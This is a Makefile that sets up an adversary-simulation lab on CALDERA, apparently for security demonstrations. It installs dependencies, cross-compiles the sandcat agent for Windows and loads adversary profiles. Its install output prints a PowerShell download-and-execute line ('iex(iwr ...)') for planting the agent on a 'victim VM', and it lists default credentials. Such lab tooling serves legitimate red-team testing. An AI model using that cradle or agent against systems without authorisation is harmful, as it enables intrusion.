# =============================================================================
# Sophos Adversary Simulation Platform — Makefile
#
# Usage:
#   make install      → full first-time setup (run this once)
#   make up           → start the stack (auto-detects LabOps mode)
#   make down         → stop the stack
#   make restart      → restart all containers
#   make status       → show container health
#   make logs         → tail all logs
#   make sandcat      → cross-compile sandcat agent for Windows (AMD64)
#   make profiles     → load CALDERA profiles and adversaries
#   make library      → rebuild caldera-library.json from profiles
#   make mitre-update → rebuild mitre-attack.json from ATT&CK data
#   make clean        → stop stack and remove all volumes (destructive!)
# =============================================================================

COMPOSE     = docker compose
CALDERA_CTR = advsim-caldera
GHCR_IMAGE  = ghcr.io/jclark2496/caldera:5.1.0

.DEFAULT_GOAL := help

# ── Help ──────────────────────────────────────────────────────────────────────

.PHONY: help
help:
	@echo ""
	@echo "  Sophos Adversary Simulation Platform — Make targets"
	@echo ""
	@echo "  make install      Full first-time setup (installs all dependencies)"
	@echo "  make up           Start all containers (auto-detects LabOps mode)"
	@echo "  make down         Stop all containers"
	@echo "  make restart      Restart all containers"
	@echo "  make status       Show container health"
	@echo "  make logs         Tail all container logs"
	@echo "  make sandcat      Cross-compile sandcat.go-windows (AMD64)"
	@echo "  make profiles     Load CALDERA profiles and adversaries"
	@echo "  make library      Rebuild caldera-library.json from profiles"
	@echo "  make mitre-update Rebuild mitre-attack.json from ATT&CK data"
	@echo "  make clean        Remove all containers and volumes (destructive)"
	@echo ""

# ── Install (first-time) ──────────────────────────────────────────────────────

.PHONY: install
install: _install-deps _check-docker _setup-ollama _env _detect-labops _generate-caldera-keys _pull-caldera _up _wait-healthy sandcat profiles mitre-update
	@echo ""
	@echo "╔══════════════════════════════════════════════════════════════╗"
	@echo "║   Sophos Adversary Simulation Platform — Ready              ║"
	@echo "╚══════════════════════════════════════════════════════════════╝"
	@echo ""
	@echo "  CALDERA:        http://localhost:8888   (red / admin)"
	@echo "  n8n:            http://localhost:5678"
	@echo "  Guacamole:      http://localhost:8085/guacamole"
	@echo "  SE Front-End:   http://localhost:8080"
	@echo "  Portainer:      http://localhost:9000"
	@echo ""
	@echo "  Next: deploy sandcat agent to victim VM:"
	@echo "    powershell -c \"iex(iwr 'http://localhost:8080/s.ps1' -UseBasicParsing)\""
	@echo ""

# ── Core stack operations ─────────────────────────────────────────────────────

.PHONY: up
up:
	@echo "▶ Starting Adversary Simulation stack..."
	@if [ -f .labops-mode ] && grep -q "labops" .labops-mode 2>/dev/null; then \
		echo "  (LabOps mode detected)"; \
		$(COMPOSE) up -d; \
	else \
		echo "  (Standalone mode — including Guacamole)"; \
		$(COMPOSE) -f docker-compose.yml -f docker-compose.guacamole.yml up -d; \
	fi
	@echo "✅ Stack started — run 'make status' to check health"

.PHONY: down
down:
	@echo "■ Stopping Adversary Simulation stack..."
	$(COMPOSE) down
	@echo "✅ Stack stopped"

.PHONY: restart
restart:
	$(COMPOSE) restart

.PHONY: status
status:
	$(COMPOSE) ps

.PHONY: logs
logs:
	$(COMPOSE) logs -f

# ── CALDERA ───────────────────────────────────────────────────────────────────

.PHONY: sandcat
sandcat:
	@echo "▶ Cross-compiling sandcat.go-windows for AMD64..."
	@docker exec $(CALDERA_CTR) bash -c \
		"cd /usr/src/app/plugins/sandcat/gocat && \
		 GOOS=windows GOARCH=amd64 go build \
		   -o /usr/src/app/plugins/sandcat/payloads/sandcat.go-windows \
		   sandcat.go" \
	&& echo "✅ sandcat.go-windows compiled (AMD64)" \
	|| echo "⚠️  Sandcat build failed — is $(CALDERA_CTR) running? Try: make up"

.PHONY: profiles
profiles:
	@echo "▶ Loading CALDERA profiles and adversaries..."
	@if python3 caldera-profiles/load_profiles.py 2>/dev/null; then \
		echo "✅ CALDERA profiles loaded"; \
	else \
		echo "⚠️  Profile load failed — is $(CALDERA_CTR) running and healthy?"; \
	fi

.PHONY: library
library:
	@echo "▶ Rebuilding CALDERA scenario library index..."
	@if python3 scripts/build-library.py; then \
		echo "✅ caldera-library.json updated"; \
	else \
		echo "⚠️  Library build failed — check caldera-profiles/ directory"; \
	fi

.PHONY: mitre-update
mitre-update:
	@echo "▶ Rebuilding MITRE ATT&CK technique index..."
	@if python3 scripts/build-mitre-attack.py; then \
		echo "✅ mitre-attack.json updated"; \
	else \
		echo "⚠️  MITRE update failed — check internet connection"; \
	fi

# ── Internal helpers ──────────────────────────────────────────────────────────

# ── Dependency Installation ─────────────────────────────────────────────────

.PHONY: _install-deps
_install-deps:
	@echo ""
	@echo "╔══════════════════════════════════════════════════════════════╗"
	@echo "║  Adversary Sim — Installing Dependencies                    ║"
	@echo "╚══════════════════════════════════════════════════════════════╝"
	@echo ""
	@# ── Homebrew ──
	@if command -v brew >/dev/null 2>&1; then \
		echo "✅ Homebrew is installed"; \
	else \
		echo "▶ Installing Homebrew..."; \
		/bin/bash -c "$$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"; \
		echo "✅ Homebrew installed"; \
	fi
	@# ── Docker Desktop ──
	@if command -v docker >/dev/null 2>&1; then \
		echo "✅ Docker is installed"; \
	else \
		echo "▶ Installing Docker Desktop (this may take a few minutes)..."; \
		brew install --cask docker; \
		echo "✅ Docker Desktop installed"; \
		echo ""; \
		echo "⚠️  Docker Desktop needs to be started manually the first time."; \
		echo "   Please open Docker Desktop from your Applications folder,"; \
		echo "   wait for it to finish starting, then run 'make install' again."; \
		echo ""; \
		exit 1; \
	fi
	@# ── Python packages ──
	@echo "▶ Checking Python packages..."
	@pip3 install -q requests pyyaml 2>/dev/null || \
		pip3 install --user -q requests pyyaml 2>/dev/null || \
		echo "⚠️  Could not install Python packages. Run manually: pip3 install requests pyyaml"
	@echo "✅ Python packages ready"
	@echo ""

.PHONY: _check-docker
_check-docker:
	@echo "▶ Verifying Docker..."
	@docker info > /dev/null 2>&1 || (echo "❌ Docker is not running. Start Docker Desktop first." && exit 1)
	@echo "✅ Docker is running"
	@docker compose version > /dev/null 2>&1 || (echo "❌ Docker Compose not found. Update Docker Desktop." && exit 1)
	@echo "✅ Docker Compose available"

.PHONY: _setup-ollama
_setup-ollama:
	@# ── Install Ollama if missing ──
	@if command -v ollama >/dev/null 2>&1; then \
		echo "✅ Ollama is installed"; \
	else \
		echo "▶ Installing Ollama..."; \
		brew install ollama 2>/dev/null || \
			(curl -fsSL https://ollama.com/install.sh | sh); \
		echo "✅ Ollama installed"; \
	fi
	@# ── Start Ollama if not running ──
	@if curl -s http://localhost:11434/api/tags > /dev/null 2>&1; then \
		echo "✅ Ollama is running"; \
	else \
		echo "▶ Starting Ollama..."; \
		if [ "$$(uname)" = "Darwin" ]; then \
			open -a Ollama 2>/dev/null || ollama serve &>/dev/null & \
		else \
			ollama serve &>/dev/null & \
		fi; \
		echo "   Waiting for Ollama to start..."; \
		for i in $$(seq 1 12); do \
			if curl -s http://localhost:11434/api/tags > /dev/null 2>&1; then \
				echo "✅ Ollama is running"; \
				break; \
			fi; \
			if [ $$i -eq 12 ]; then \
				echo "⚠️  Ollama did not start. Run manually: ollama serve"; \
			fi; \
			sleep 2; \
		done; \
	fi
	@# ── Pull model if not already downloaded ──
	@MODEL=$${OLLAMA_MODEL:-llama3.2:3b}; \
	if ollama list 2>/dev/null | grep -q "$$MODEL"; then \
		echo "✅ Ollama model $$MODEL is ready"; \
	else \
		echo "▶ Pulling Ollama model $$MODEL (this may take a few minutes)..."; \
		ollama pull $$MODEL 2>/dev/null && \
			echo "✅ Model $$MODEL pulled" || \
			echo "⚠️  Could not pull model. Run manually: ollama pull $$MODEL"; \
	fi

.PHONY: _env
_env:
	@if [ ! -f .env ]; then \
		if [ -f .env.example ]; then \
			cp .env.example .env; \
			echo "⚠️  Created .env from template — edit it before proceeding"; \
		else \
			echo "❌ No .env or .env.example found"; \
			exit 1; \
		fi; \
	else \
		echo "✅ .env exists"; \
	fi
	@N8N_PW=$$(grep '^N8N_PASSWORD=' .env 2>/dev/null | cut -d'=' -f2-); \
	if [ -z "$$N8N_PW" ]; then \
		echo "   Generating N8N_PASSWORD..."; \
		NEW_PW=$$(python3 -c "import secrets; print(secrets.token_urlsafe(16))"); \
		if [ "$$(uname)" = "Darwin" ]; then \
			sed -i '' "s/^N8N_PASSWORD=$$/N8N_PASSWORD=$$NEW_PW/" .env; \
		else \
			sed -i "s/^N8N_PASSWORD=$$/N8N_PASSWORD=$$NEW_PW/" .env; \
		fi; \
		echo "✅ N8N_PASSWORD auto-generated: $$NEW_PW"; \
	else \
		echo "✅ N8N_PASSWORD is set"; \
	fi

.PHONY: _detect-labops
_detect-labops:
	@echo "▶ Detecting deployment mode..."
	@if [ -x scripts/detect-labops.sh ]; then \
		scripts/detect-labops.sh > .labops-mode; \
	else \
		echo "standalone" > .labops-mode; \
	fi
	@MODE=$$(cat .labops-mode); \
	if [ "$$MODE" = "labops" ]; then \
		echo "✅ LabOps detected — joining labops-net network"; \
		printf 'networks:\n  default:\n    name: labops-net\n    external: true\n' > docker-compose.override.yml; \
	else \
		echo "✅ Standalone mode — creating advsim-net network"; \
		printf 'networks:\n  default:\n    name: advsim-net\n    driver: bridge\n    ipam:\n      config:\n        - subnet: 172.20.0.0/24\n' > docker-compose.override.yml; \
	fi

.PHONY: _generate-caldera-keys
_generate-caldera-keys:
	@echo "▶ Checking CALDERA crypto keys..."
	@if grep -q 'PLACEHOLDER_SALT' caldera/conf/local.yml 2>/dev/null; then \
		NEW_SALT=$$(python3 -c "import secrets; print(secrets.token_hex(32))"); \
		sed -i '' "s/PLACEHOLDER_SALT/$$NEW_SALT/g" caldera/conf/local.yml; \
		echo "✅ Generated new crypt_salt"; \
	else \
		echo "✅ crypt_salt already set"; \
	fi
	@if grep -q 'PLACEHOLDER_KEY' caldera/conf/local.yml 2>/dev/null; then \
		NEW_KEY=$$(python3 -c "import secrets; print(secrets.token_hex(32))"); \
		sed -i '' "s/PLACEHOLDER_KEY/$$NEW_KEY/g" caldera/conf/local.yml; \
		echo "✅ Generated new encryption_key"; \
	else \
		echo "✅ encryption_key already set"; \
	fi

.PHONY: _pull-caldera
_pull-caldera:
	@echo "▶ Pulling CALDERA image from GHCR..."
	@docker pull $(GHCR_IMAGE) \
	&& docker tag $(GHCR_IMAGE) caldera:local \
	&& echo "✅ CALDERA image ready ($(GHCR_IMAGE))" \
	|| (echo "❌ Failed to pull CALDERA from GHCR." && \
	    echo "   If repo is private, authenticate first:" && \
	    echo "     gh auth refresh -s read:packages" && \
	    echo "     echo \$$(gh auth token) | docker login ghcr.io -u jclark2496 --password-stdin" && \
	    exit 1)

.PHONY: _up
_up:
	@echo "▶ Starting containers..."
	@if [ -f .labops-mode ] && grep -q "labops" .labops-mode 2>/dev/null; then \
		echo "  (LabOps mode — using base compose only)"; \
		$(COMPOSE) up -d; \
	else \
		echo "  (Standalone mode — including Guacamole)"; \
		$(COMPOSE) -f docker-compose.yml -f docker-compose.guacamole.yml up -d; \
	fi

.PHONY: _wait-healthy
_wait-healthy:
	@echo "▶ Waiting for CALDERA to be healthy (up to 120s)..."
	@for i in $$(seq 1 24); do \
		if docker inspect --format='{{.State.Health.Status}}' $(CALDERA_CTR) 2>/dev/null | grep -q healthy; then \
			echo "✅ CALDERA is healthy"; \
			break; \
		fi; \
		if [ $$i -eq 24 ]; then \
			echo "⚠️  CALDERA health check timed out — it may still be initializing"; \
			echo "   Check with: docker compose logs -f caldera"; \
		fi; \
		printf "."; \
		sleep 5; \
	done

# ── Cleanup ───────────────────────────────────────────────────────────────────

.PHONY: clean
clean:
	@echo "⚠️  This will stop all containers and delete all volumes."
	@read -p "Are you sure? [y/N] " confirm && [ "$$confirm" = "y" ] || exit 0
	$(COMPOSE) down -v
	@echo "✅ All containers and volumes removed"
